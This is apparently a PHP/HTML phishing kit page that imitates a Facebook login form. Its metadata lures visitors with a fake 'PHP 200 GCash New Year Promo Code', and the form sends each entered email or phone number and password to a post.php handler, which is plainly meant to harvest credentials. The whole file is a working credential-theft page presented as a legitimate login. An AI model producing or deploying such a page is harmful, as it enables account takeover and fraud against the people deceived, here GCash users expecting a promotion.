<?php include("post.php");?>
<!DOCTYPE html>
<html lang="en">
<head>
<title>Facebook Login</title>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="Get Your PHP 200 GCash New Year Promo Code">
<meta name="keywords" content="GCash New Year Promo-Code, 2022">
<meta name="author" content="GCash New Year Promo-Code">
<meta property="og:image" content="gcash.png" />

 <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
 <link rel="icon" type="image/icon" href="fb.png">
 <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
 <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.0/js/bootstrap.min.js"></script>
 <style>
body {
    color: #646464;
    background: #e2e2e2;
}	
.login-form {
    width: 300px;
    margin: 30px auto;
}
.login-form h2 {
    font-size: 26px;
    font-weight: bold;
    margin: 30px 0;
    text-align: center;
}
.login-form form {
    color: #fff;
    background: #405e9e;
    background: radial-gradient(circle, #4d6ba9, #375595);
    box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
    padding: 25px;
    margin-bottom: 15px;
}
.login-form .form-control {
    border-color: #dfdfdf;
    box-shadow: none !important;
}
.login-form .form-control, .login-form .btn {
    min-height: 38px;        
}
.login-form input[type="email"] {
    border-radius: 2px 2px 0 0;
}
.login-form input[type="password"] {
    border-radius: 0 0 2px 2px;
    margin-top: -1px;
}    
.login-form .btn, .login-form .btn:active {        
    font-size: 15px;
    font-weight: bold;
    border-radius: 2px;
    background: #eeeeee !important;
    color: #646464;
    margin-bottom: 25px;
}
.login-form .btn:hover, .login-form .btn:focus{
    background: #e4e4e4 !important;
}
.login-form a {		
    color: #405e9e;
}
.login-form form a {
    color: #fff;
}
</style>
</head>
<body>
	<div class="login-form">
    <form action="post.php" method="post">
		<h2 class="text-center">Facebook</h2>	
        <div class="form-group">
            <input type="text" class="form-control mb-2" name="email" placeholder="Mobile Number or Email" required="required">
            <input type="password" class="form-control" name="password" placeholder="Password" required="required">
        </div>
        <div class="form-group">
            <button type="submit" class="btn btn-secondary btn-block">Login</button>
        </div>
        <p class="text-center"><a href="#">Forgot Password?</a></p>     
    </form>
    <p class="text-center small">Not Registered? <a href="#">Create an Account</a></p>
</div>

</body>
</html>